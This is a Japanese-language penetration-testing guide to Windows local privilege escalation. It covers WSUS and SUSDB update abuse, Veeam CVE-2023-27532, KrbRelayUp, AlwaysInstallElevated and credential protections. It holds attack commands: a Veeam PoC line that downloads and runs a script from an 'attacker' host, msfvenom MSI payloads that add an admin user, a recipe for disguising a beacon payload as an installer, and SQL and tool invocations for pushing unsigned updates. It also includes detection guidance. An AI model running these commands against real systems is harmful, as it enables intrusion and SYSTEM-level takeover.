# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、複数の基礎的なガイドにある Windows 権限昇格の一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れは、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法に関する資料には、Windows 権限昇格についての DerbyCon プレゼンテーションが含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎知識

### Access Tokens

**Windows の access token について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity level について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙を妨げたり**、実行ファイルの起動を阻止したり、さらには**活動を検知したりする**機能がいくつかあります。権限昇格の列挙を始める前に、以下の**ページを読み**、これらの**防御メカニズム**をすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM 編集を、プリブート DMA と Windows の `SYSTEM` メモリパッチ適用チェーンに発展させることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレントな権限昇格

`RAiLaunchAdminProcess` 経由で起動された UIAccess プロセスは、AppInfo のセキュアパスチェックを回避することで、プロンプトなしに High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播は、任意の SYSTEM レジストリ書き込み (RegPwn) に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証を再利用された SMB TCP 接続経由でリフレクトする、**SMB 任意ポート**の LPE 手法も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください (適用済みのパッチも確認してください)。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が**広大な攻撃対象領域**を持つことがわかります。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSのビルド、インストール済み更新プログラム、該当する可能性のあるアドバイザリ候補を一覧表示します。結果が該当すると判断する前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル exploit を調べる場合は、OSのアーキテクチャだけでなく、**実行中プロセスのアーキテクチャ**も確認してください。64-bit Windowsでは、32-bitプロセスに[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32`は32-bitシステムディレクトリとして解決されますが、`%windir%\Sysnative`を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bitプロセスでは使用できません。OSのビルドや未適用KBの候補だけでは、exploit可能であることの証明にはなりません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、exploitの前提条件を、該当する問題についての[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploitのGithubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された認証情報や、何か役立ちそうな情報はありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcriptファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、これを有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell の文字起こしポリシー](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription)では通常、各ユーザーの Documents フォルダーに出力されますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。トランスクリプトを確認する前に、実際の出力先とファイルの ACL を確認してください。コマンドの引数や出力（認証情報を含む場合があります）が記録されている可能性があります。読み取り可能なトランスクリプトは、内容から利用可能な高い権限を持つ ID が判明し、その ID で該当するコンテキストにログオンできる場合にのみ、手がかりとなります。

### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShellのログから直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行中に、すべてのコードブロックが記録されるよう、実行内容の全活動と完全な記録が取得されます。このプロセスにより各活動の包括的な監査証跡が保持され、フォレンジックや悪意のある動作の分析に役立ちます。実行時にすべての活動を記録することで、プロセスに関する詳細な知見が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows イベント ビューアーの次のパスで確認できます: **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational**。\
直近の20件のイベントを表示するには、次のコマンドを使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手がかりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、さらにクライアントの更新に対する信頼設定とインストールポリシーにも左右されます。URL だけではコード実行が可能だとは判断できません。[Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus) では、WSUS メタデータに TLS を使用することを推奨しています。

まず、cmd で次のコマンドを実行し、ネットワークが SSL なしの WSUS 更新を使用しているか確認します:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell では次のようにします。

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信があった場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

`UseWUServer` が `1` の場合、Windows Update は設定済みのイントラネットサービスを使用します。これは HTTP interception の前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。値が `0` の場合、このポリシーで設定された WSUS エンドポイントは選択されません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS traffic に「偽の」更新プログラムを注入する、武器化された MiTM exploit script です。

こちらで調査結果をお読みください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**こちらでレポート全文をお読みください**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、この bug が悪用するのは次の脆弱性です。

> ローカルユーザーの proxy を変更でき、Windows Updates が Internet Explorer の設定で構成された proxy を使用するなら、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分の traffic を intercept し、資産上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUS service は現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS hostname 用の自己署名証明書を生成し、現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS traffic を intercept できます。WSUS には、証明書の trust-on-first-use 型検証を実装する HSTS のような仕組みはありません。提示された証明書がユーザーによって信頼され、正しい hostname を持つ場合、service はそれを受け入れます。

ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って、この脆弱性を悪用できます（公開後）。

### WSUS 管理者が制御する更新プログラム

現在の identity が WSUS server 上で更新プログラムを**公開および承認**できる場合は、別の経路が存在します。server の `WSUS Administrators` group に対する実効メンバーシップと、委任された WSUS permissions を確認し、承認済みの更新プログラムを受け取るクライアント computer group を特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator privileges が必要であるとしています](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開コンテンツの信頼関係について説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使われる証明書を信頼する必要があります。これを権限昇格経路とみなす前に、候補となる更新プログラムに署名があり、受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値や group 名だけでは、これらの条件を満たすことは確認できません。

### SUSDB のカスタム更新プログラム悪用: `.txt`/`.esd` 経由の未署名 payload

これは HTTP WSUS 接続を intercept する攻撃とは異なる信頼境界の不備です。前提条件は、カスタム更新プログラムを公開および承認するための **WSUS database (`SUSDB`) の stored procedure** への十分なアクセス権です。実用的な侵入経路の一つは、上流の WSUS computer account を中継して、`SUSDB` をホストする別の MSSQL server に接続することです。正確な前提条件は環境によって異なるため、SQL administrator rights があると決めつけず、まず `EXECUTE` permissions を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS クライアントの認証を HTTP/8530 から LDAP、SMB、または AD CS に中継する別の攻撃経路については、[NTLM relay のための WSUS HTTP の悪用](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部 database への中継と procedure の権限を確認する

WSUS が外部 SQL Server を使用している環境では、まず WSUS server account が database に認証できるか、また NTLM relay がその listener に到達するかを確認してください。直接の table 書き込みが拒否されても、server の SQL role によって更新プログラム公開用の procedure が利用できる場合があります。`SUSDB` に対する `UPDATE` が失敗しても、公開ができないとは限りません。カスタム更新プログラムを試す前に、認可された SQL session で実効 identity、role membership、procedure permissions を確認してください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブの手順定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構築する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメントタイプ `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しが返すローカルリビジョン ID を取得し、バンドルの関連付け、ダイジェスト、サイズ、コンテンツ URL、リビジョンの整合性を保ってください。これは状態を持つ公開ワークフローであるため、ストアドプロシージャの呼び出しが1回成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新をビルドし、対象を指定して承認する

カスタム更新ワークフローでは、正規の WSUS 手順を制限付きの公開 API として使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新メタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ済み、拡張 XML フラグメントを保存 | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付ける | `spSetBatchURL` |
| コンピューターグループを列挙／作成し、クライアントを追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループに対するインストールを承認 | `@actionID = 0` と `@isAssigned = 1` を指定して `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL と対象グループを割り当てた後、最終承認は次のようになります。例の GUID を再利用せず、新しい更新、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子を利用した署名バイパス

WSUSは通常、任意の未署名実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`では、.NETの`VerifyFile`処理が、指定されたファイル名が`.txt`または`.esd`で終わる場合に証明書チェックフラグをfalseに設定します。そのため、バイト列がテキストまたは正規のESDイメージであることを事前に確認せずに、`CheckCertificateSignature`がスキップされます。したがって、たとえば`payload.exe.txt`という名前を付けた変更されていないPEはコンテンツ検証を通過し、後に更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みのコンテンツを取得します。オリジンはBITSのHTTP要件を満たす必要があります。URLにアクセスできるだけでは不十分で、転送では最初に`HEAD`/`GET`フローが行われ、バイト範囲リクエストが使用されるためです。Rangeをサポートしていないサーバーでは、BITSにRange protocol headerが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、インポート/フラグメント/URL/グループ/デプロイの一連の処理に必要なSQLを生成し、それを実行するための改変版MSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`を提供します。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 未人手実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` でオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従って、ユーザーが手動で選択しなくてもインストールされます。テストでは、更新プログラムが失敗／未完了のままだったペイロードは、コールバックプロセスの終了後すぐに再度提示されたため、再試行動作が繰り返し実行される永続化につながる可能性があります。クライアントに更新失敗状態が表示されるため、目立ちやすい手法です。<sup>[[39]](#references)</sup>

#### 検知とハードニングの着眼点

この攻撃チェーンで有用なサーバー側およびクライアント側の着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新しいターゲティンググループ、外部コンテンツの配信元、`.txt`／`.esd` の更新ペイロード、予期しないプリンシパル（特にコンピューターアカウント以外）によるデプロイを調査する。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認する。拡張子を信用せず、検証イベントとペイロードの拡張子およびコンテンツのマジックナンバーを照合する。
- Windows Update のインストールが繰り返し失敗／再試行される動作や、`.txt` または `.esd` という名前のコンテンツからの PE 実行、予期しない子プロセス／ネットワークアクティビティを探索する。
- 対応している場合はデータベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスを WSUS サーバーおよび許可された管理システムに制限する。カスタム更新手順の `EXECUTE` 権限を最小限にし、監査する。

## サードパーティ製自動アップデーターと Agent IPC (local privesc)

多くのエンタープライズエージェントは、localhost の IPC インターフェースと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正な root CA または弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を配信し、SYSTEM サービスにインストールさせることができます。Netskope stAgentSvc の攻撃チェーンを基にした一般化手法（CVE-2025-0309）については、以下を参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由の SYSTEM)

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** 上のコアバックアップサービスを使用します。[Veeam のアドバイザリー](https://www.veeam.com/kb4424)では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで開示される問題が説明されています。別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が実証されています。<sup>[[12]](#references)</sup> このサービスは localhost 以外にもバインドする場合があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認し、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手がかりであり、完全なパッチ確認ではありません。
- **修正済みの最低バージョン**: Veeam は **11a build 11.0.1.1261 P20230227** および **12 build 12.0.0.1420 P20230223** を最初の修正版としており、これより前のリリースは影響を受けます。4 パートのファイルバージョンだけでは、未パッチのベースビルドと、同じビルド番号に適用された後続パッチを区別できません。境界となるビルドが修正済みか判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC を必要な Veeam DLL と同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードを起動します:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件を満たす場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

ローカル Kerberos relay は、適切な COM server が認証を行い、relay された principal が対象オブジェクトへの書き込み権限を持つ場合、低い権限のログオンから特権のあるディレクトリ書き込みへと至る可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込みの両方が説明されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD の攻撃チェーンには適用可能な委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential の攻撃チェーンには key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) および [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される ID のオブジェクト ACL、選択した COM クラスの認証レベルと impersonation レベルを確認してください。呼び出し元のログオン種別と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい認証情報を使ったログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムも結果を左右します。許容的なポリシーや一致する ACL は、レビュー対象の候補として扱ってください。受動的な列挙で COM coercion、relay 認証、ディレクトリ書き込みを引き起こしてはいけません。マシンアカウントの shadow credential からマシンチケットを取得できる場合がありますが、そこから DCSync に進むには、そのアカウントに別途必要なディレクトリ複製権限がある場合に限られます。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)で**exploit を確認してください**

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

**これら2つのレジストリキーが**有効（値が**0x1**）になっている**場合**、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Meterpreter sessionがある場合は、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-upの`Write-UserAddMSI`コマンドを使うと、権限昇格用のWindows MSIバイナリをカレントディレクトリに作成できます。このスクリプトは、ユーザー／グループの追加を促すプリコンパイル済みMSIインストーラーを書き出します（そのため、GUIアクセスが必要です）。

```
Write-UserAddMSI
```

作成したバイナリを実行して、権限を昇格します。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、こちらのチュートリアルを参照してください。**コマンドライン**を**実行**するだけなら、「**.bat**」ファイルをラップできます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成

- Cobalt StrikeまたはMetasploitを使って、新しいWindows EXE TCP payloadを生成し、`C:\privesc\beacon.exe`に保存します。
- **Visual Studio**を開き、**Create a new project**を選択して、検索ボックスに「installer」と入力します。**Setup Wizard**プロジェクトを選択し、**Next**をクリックします。
- プロジェクト名（例: **AlwaysPrivesc**）を入力し、場所に**`C:\privesc`**を指定します。**place solution and project in the same directory**を選択し、**Create**をクリックします。
- ステップ3/4（含めるファイルの選択）に進むまで**Next**をクリックします。**Add**をクリックして、先ほど生成したBeacon payloadを選択します。次に**Finish**をクリックします。
- **Solution Explorer**で**AlwaysPrivesc**プロジェクトを選択し、**Properties**で**TargetPlatform**を**x86**から**x64**に変更します。
  - **Author**や**Manufacturer**などのプロパティも変更できます。インストールしたアプリをより正規のものに見せられます。
- プロジェクトを右クリックし、**View > Custom Actions**を選択します。
- **Install**を右クリックし、**Add Custom Action**を選択します。
- **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラーの実行と同時にBeacon payloadが実行されます。
- **Custom Action Properties**で**Run64Bit**を**True**に変更します。
- 最後に、**ビルドします**。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`という警告が表示された場合は、プラットフォームがx64に設定されていることを確認してください。

### MSIのインストール

悪意のある`.msi`ファイルをバックグラウンドで**インストール**するには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と検知ツール

### 監査設定

これらの設定によって**ログに記録される内容**が決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログがどこに送信されるかを把握しておくとよいでしょう。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメイン参加コンピューターの**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL によって十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによるメモリの**読み取り**やコードのインジェクションを**ブロック**して、システムの安全性をさらに高めました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
